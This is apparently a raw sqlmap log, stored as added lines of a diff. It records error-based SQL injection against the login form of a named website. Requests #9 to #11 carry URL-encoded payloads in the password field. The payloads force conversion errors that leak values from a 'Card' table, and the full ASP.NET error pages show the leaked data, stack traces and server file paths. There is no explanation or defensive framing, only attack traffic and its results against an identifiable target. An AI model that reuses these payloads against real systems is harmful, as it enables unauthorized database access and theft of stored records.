+         .version {color: gray;}
+         .error {margin-bottom: 10px;}
+         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }
+        </style>
+    </head>
+
+    <body bgcolor="white">
+
+            <span><H1>“/”应用程序中的服务器错误。<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>在将 nvarchar 值 'qkxvq2qxqjq' 转换成数据类型 int 时失败。</i> </h2></span>
+
+            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">
+
+            <b> 说明: </b>执行当前 Web 请求期间，出现未经处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。
+
+            <br><br>
+
+            <b> 异常详细信息: </b>System.Data.SqlClient.SqlException: 在将 nvarchar 值 'qkxvq2qxqjq' 转换成数据类型 int 时失败。<br><br>
+
+            <b>源错误:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+行 22:         Dim sc As New SqlCommand(sql, Conn)
+行 23:         Dim da As New SqlDataAdapter(sc)
+<font color=red>行 24:         da.Fill(ds)
+</font>行 25:         Return ds.Tables(0)
+行 26:     End Function</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <b> 源文件: </b> D:\MLWeb\App_Code\SQL.vb<b> \xa0\xa0 行: </b> 24
+            <br><br>
+
+            <b>堆栈跟踪:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+[SqlException (0x80131904): 在将 nvarchar 值 'qkxvq2qxqjq' 转换成数据类型 int 时失败。]
+   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +404
+   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning() +412
+   System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1363
+   System.Data.SqlClient.SqlDataReader.HasMoreRows() +301
+   System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout) +422
+   System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping) +167
+   System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue) +292
+   System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords) +529
+   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +422
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +420
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +306
+   SQL.SelectSQl(String sql) in D:\MLWeb\App_Code\SQL.vb:24
+   web_Login.GetList(String strWhere) in d:\MLWeb\Login.aspx.cs:201
+   web_Login.Login(String uid, String pass) in d:\MLWeb\Login.aspx.cs:157
+   web_Login.Page_Load(Object sender, EventArgs e) in d:\MLWeb\Login.aspx.cs:39
+   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +25
+   System.Web.UI.Control.LoadRecursive() +71
+   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +3064
+</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <hr width=100% size=1 color=silver>
+
+            <b>版本信息:</b>\xa0Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.272
+
+            </font>
+
+    </body>
+</html>
+<!-- 
+[SqlException]: 在将 nvarchar 值 'qkxvq2qxqjq' 转换成数据类型 int 时失败。
+   在 System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
+   在 System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
+   在 System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
+   在 System.Data.SqlClient.SqlDataReader.HasMoreRows()
+   在 System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout)
+   在 System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping)
+   在 System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue)
+   在 System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords)
+   在 System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet)
+   在 SQL.SelectSQl(String sql) 位置 D:\MLWeb\App_Code\SQL.vb:行号 24
+   在 web_Login.GetList(String strWhere) 位置 d:\MLWeb\Login.aspx.cs:行号 201
+   在 web_Login.Login(String uid, String pass) 位置 d:\MLWeb\Login.aspx.cs:行号 157
+   在 web_Login.Page_Load(Object sender, EventArgs e) 位置 d:\MLWeb\Login.aspx.cs:行号 39
+   在 System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e)
+   在 System.Web.UI.Control.LoadRecursive()
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+[HttpUnhandledException]: 引发类型为“System.Web.HttpUnhandledException”的异常。
+   在 System.Web.UI.Page.HandleError(Exception e)
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest()
+   在 System.Web.UI.Page.ProcessRequest(HttpContext context)
+   在 ASP.login_aspx.ProcessRequest(HttpContext context) 位置 c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\06f31654\b4da8005\App_Web_sadlj52d.10.cs:行号 0
+   在 System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+   在 System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
+--><!-- 
+此错误页可能包含敏感信息，因为 ASP.NET 通过 &lt;customErrors mode="Off"/> 被配置为显示详细错误消息。请考虑在生产环境中使用 <customErrors mode="On"/> 或 <customErrors mode="RemoteOnly"/>。-->
+
+############################################################################
+
+HTTP request [#9]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 504
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%205072%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28shiyongIP%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2851%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20DSGZ&s=false
+
+HTTP response [#9] (500 Internal Server Error):
+Content-length: 8087
+X-powered-by: CG
+X-aspnet-version: 4.0.30319
+Uri: http://www.moli1.com:80/Login.aspx
+Server: Microsoft-IIS/7.5
+Connection: close
+Cache-control: private,max-age=999990
+Date: Thu, 04 Aug 2016 10:45:45 GMT
+Content-type: text/html; charset=utf-8
+
+<html>
+    <head>
+        <title>在将 nvarchar 值 'qkxvq110.180.99.168qxqjq' 转换成数据类型 int 时失败。</title>
+        <style>
+         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
+         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
+         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
+         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
+         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
+         pre {font-family:"Lucida Console";font-size: .9em}
+         .marker {font-weight: bold; color: black;text-decoration: none;}
+         .version {color: gray;}
+         .error {margin-bottom: 10px;}
+         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }
+        </style>
+    </head>
+
+    <body bgcolor="white">
+
+            <span><H1>“/”应用程序中的服务器错误。<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>在将 nvarchar 值 'qkxvq110.180.99.168qxqjq' 转换成数据类型 int 时失败。</i> </h2></span>
+
+            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">
+
+            <b> 说明: </b>执行当前 Web 请求期间，出现未经处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。
+
+            <br><br>
+
+            <b> 异常详细信息: </b>System.Data.SqlClient.SqlException: 在将 nvarchar 值 'qkxvq110.180.99.168qxqjq' 转换成数据类型 int 时失败。<br><br>
+
+            <b>源错误:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+行 22:         Dim sc As New SqlCommand(sql, Conn)
+行 23:         Dim da As New SqlDataAdapter(sc)
+<font color=red>行 24:         da.Fill(ds)
+</font>行 25:         Return ds.Tables(0)
+行 26:     End Function</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <b> 源文件: </b> D:\MLWeb\App_Code\SQL.vb<b> \xa0\xa0 行: </b> 24
+            <br><br>
+
+            <b>堆栈跟踪:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+[SqlException (0x80131904): 在将 nvarchar 值 'qkxvq110.180.99.168qxqjq' 转换成数据类型 int 时失败。]
+   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +404
+   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning() +412
+   System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1363
+   System.Data.SqlClient.SqlDataReader.HasMoreRows() +301
+   System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout) +422
+   System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping) +167
+   System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue) +292
+   System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords) +529
+   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +422
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +420
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +306
+   SQL.SelectSQl(String sql) in D:\MLWeb\App_Code\SQL.vb:24
+   web_Login.GetList(String strWhere) in d:\MLWeb\Login.aspx.cs:201
+   web_Login.Login(String uid, String pass) in d:\MLWeb\Login.aspx.cs:157
+   web_Login.Page_Load(Object sender, EventArgs e) in d:\MLWeb\Login.aspx.cs:39
+   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +25
+   System.Web.UI.Control.LoadRecursive() +71
+   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +3064
+</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <hr width=100% size=1 color=silver>
+
+            <b>版本信息:</b>\xa0Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.272
+
+            </font>
+
+    </body>
+</html>
+<!-- 
+[SqlException]: 在将 nvarchar 值 'qkxvq110.180.99.168qxqjq' 转换成数据类型 int 时失败。
+   在 System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
+   在 System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
+   在 System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
+   在 System.Data.SqlClient.SqlDataReader.HasMoreRows()
+   在 System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout)
+   在 System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping)
+   在 System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue)
+   在 System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords)
+   在 System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet)
+   在 SQL.SelectSQl(String sql) 位置 D:\MLWeb\App_Code\SQL.vb:行号 24
+   在 web_Login.GetList(String strWhere) 位置 d:\MLWeb\Login.aspx.cs:行号 201
+   在 web_Login.Login(String uid, String pass) 位置 d:\MLWeb\Login.aspx.cs:行号 157
+   在 web_Login.Page_Load(Object sender, EventArgs e) 位置 d:\MLWeb\Login.aspx.cs:行号 39
+   在 System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e)
+   在 System.Web.UI.Control.LoadRecursive()
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+[HttpUnhandledException]: 引发类型为“System.Web.HttpUnhandledException”的异常。
+   在 System.Web.UI.Page.HandleError(Exception e)
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest()
+   在 System.Web.UI.Page.ProcessRequest(HttpContext context)
+   在 ASP.login_aspx.ProcessRequest(HttpContext context) 位置 c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\06f31654\b4da8005\App_Web_sadlj52d.10.cs:行号 0
+   在 System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+   在 System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
+--><!-- 
+此错误页可能包含敏感信息，因为 ASP.NET 通过 &lt;customErrors mode="Off"/> 被配置为显示详细错误消息。请考虑在生产环境中使用 <customErrors mode="On"/> 或 <customErrors mode="RemoteOnly"/>。-->
+
+############################################################################
+
+HTTP request [#10]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 491
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%208727%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MIN%28ISNULL%28CAST%28num%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%3ECHAR%2849%29%2BCHAR%2851%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20YGEe&s=false
+
+HTTP response [#10] (500 Internal Server Error):
+Content-length: 8027
+X-powered-by: CG
+X-aspnet-version: 4.0.30319
+Uri: http://www.moli1.com:80/Login.aspx
+Server: Microsoft-IIS/7.5
+Connection: close
+Cache-control: private,max-age=999990
+Date: Thu, 04 Aug 2016 10:45:45 GMT
+Content-type: text/html; charset=utf-8
+
+<html>
+    <head>
+        <title>在将 nvarchar 值 'qkxvq14qxqjq' 转换成数据类型 int 时失败。</title>
+        <style>
+         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
+         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
+         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
+         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
+         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
+         pre {font-family:"Lucida Console";font-size: .9em}
+         .marker {font-weight: bold; color: black;text-decoration: none;}
+         .version {color: gray;}
+         .error {margin-bottom: 10px;}
+         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }
+        </style>
+    </head>
+
+    <body bgcolor="white">
+
+            <span><H1>“/”应用程序中的服务器错误。<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>在将 nvarchar 值 'qkxvq14qxqjq' 转换成数据类型 int 时失败。</i> </h2></span>
+
+            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">
+
+            <b> 说明: </b>执行当前 Web 请求期间，出现未经处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。
+
+            <br><br>
+
+            <b> 异常详细信息: </b>System.Data.SqlClient.SqlException: 在将 nvarchar 值 'qkxvq14qxqjq' 转换成数据类型 int 时失败。<br><br>
+
+            <b>源错误:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+行 22:         Dim sc As New SqlCommand(sql, Conn)
+行 23:         Dim da As New SqlDataAdapter(sc)
+<font color=red>行 24:         da.Fill(ds)
+</font>行 25:         Return ds.Tables(0)
+行 26:     End Function</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <b> 源文件: </b> D:\MLWeb\App_Code\SQL.vb<b> \xa0\xa0 行: </b> 24
+            <br><br>
+
+            <b>堆栈跟踪:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+[SqlException (0x80131904): 在将 nvarchar 值 'qkxvq14qxqjq' 转换成数据类型 int 时失败。]
+   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +404
+   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning() +412
+   System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1363
+   System.Data.SqlClient.SqlDataReader.HasMoreRows() +301
+   System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout) +422
+   System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping) +167
+   System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue) +292
+   System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords) +529
+   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +422
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +420
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +306
+   SQL.SelectSQl(String sql) in D:\MLWeb\App_Code\SQL.vb:24
+   web_Login.GetList(String strWhere) in d:\MLWeb\Login.aspx.cs:201
+   web_Login.Login(String uid, String pass) in d:\MLWeb\Login.aspx.cs:157
+   web_Login.Page_Load(Object sender, EventArgs e) in d:\MLWeb\Login.aspx.cs:39
+   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +25
+   System.Web.UI.Control.LoadRecursive() +71
+   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +3064
+</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <hr width=100% size=1 color=silver>
+
+            <b>版本信息:</b>\xa0Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.272
+
+            </font>
+
+    </body>
+</html>
+<!-- 
+[SqlException]: 在将 nvarchar 值 'qkxvq14qxqjq' 转换成数据类型 int 时失败。
+   在 System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
+   在 System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
+   在 System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
+   在 System.Data.SqlClient.SqlDataReader.HasMoreRows()
+   在 System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout)
+   在 System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping)
+   在 System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue)
+   在 System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords)
+   在 System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet)
+   在 SQL.SelectSQl(String sql) 位置 D:\MLWeb\App_Code\SQL.vb:行号 24
+   在 web_Login.GetList(String strWhere) 位置 d:\MLWeb\Login.aspx.cs:行号 201
+   在 web_Login.Login(String uid, String pass) 位置 d:\MLWeb\Login.aspx.cs:行号 157
+   在 web_Login.Page_Load(Object sender, EventArgs e) 位置 d:\MLWeb\Login.aspx.cs:行号 39
+   在 System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e)
+   在 System.Web.UI.Control.LoadRecursive()
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+[HttpUnhandledException]: 引发类型为“System.Web.HttpUnhandledException”的异常。
+   在 System.Web.UI.Page.HandleError(Exception e)
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest()
+   在 System.Web.UI.Page.ProcessRequest(HttpContext context)
+   在 ASP.login_aspx.ProcessRequest(HttpContext context) 位置 c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\06f31654\b4da8005\App_Web_sadlj52d.10.cs:行号 0
+   在 System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+   在 System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
+--><!-- 
+此错误页可能包含敏感信息，因为 ASP.NET 通过 &lt;customErrors mode="Off"/> 被配置为显示详细错误消息。请考虑在生产环境中使用 <customErrors mode="On"/> 或 <customErrors mode="RemoteOnly"/>。-->
+
+############################################################################
+
+HTTP request [#11]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 498
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%203846%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28rid%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2852%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20yElF&s=false
+
+HTTP response [#11] (500 Internal Server Error):
+Content-length: 8027
+X-powered-by: CG
+X-aspnet-version: 4.0.30319
+Uri: http://www.moli1.com:80/Login.aspx
+Server: Microsoft-IIS/7.5
+Connection: close
+Cache-control: private,max-age=999990
+Date: Thu, 04 Aug 2016 10:45:46 GMT
+Content-type: text/html; charset=utf-8
+
+<html>
+    <head>
+        <title>在将 nvarchar 值 'qkxvq29qxqjq' 转换成数据类型 int 时失败。</title>
+        <style>
+         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
+         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
+         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
+         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
+         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
+         pre {font-family:"Lucida Console";font-size: .9em}
+         .marker {font-weight: bold; color: black;text-decoration: none;}
+         .version {color: gray;}
+         .error {margin-bottom: 10px;}
+         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }
+        </style>
+    </head>
+
+    <body bgcolor="white">
+
+            <span><H1>“/”应用程序中的服务器错误。<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>在将 nvarchar 值 'qkxvq29qxqjq' 转换成数据类型 int 时失败。</i> </h2></span>
+
+            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">
+
+            <b> 说明: </b>执行当前 Web 请求期间，出现未经处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。
+
+            <br><br>
+
+            <b> 异常详细信息: </b>System.Data.SqlClient.SqlException: 在将 nvarchar 值 'qkxvq29qxqjq' 转换成数据类型 int 时失败。<br><br>
+
+            <b>源错误:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+行 22:         Dim sc As New SqlCommand(sql, Conn)
+行 23:         Dim da As New SqlDataAdapter(sc)
+<font color=red>行 24:         da.Fill(ds)
+</font>行 25:         Return ds.Tables(0)
+行 26:     End Function</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <b> 源文件: </b> D:\MLWeb\App_Code\SQL.vb<b> \xa0\xa0 行: </b> 24
+            <br><br>
+
+            <b>堆栈跟踪:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+[SqlException (0x80131904): 在将 nvarchar 值 'qkxvq29qxqjq' 转换成数据类型 int 时失败。]
+   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +404
+   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning() +412
+   System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1363
+   System.Data.SqlClient.SqlDataReader.HasMoreRows() +301
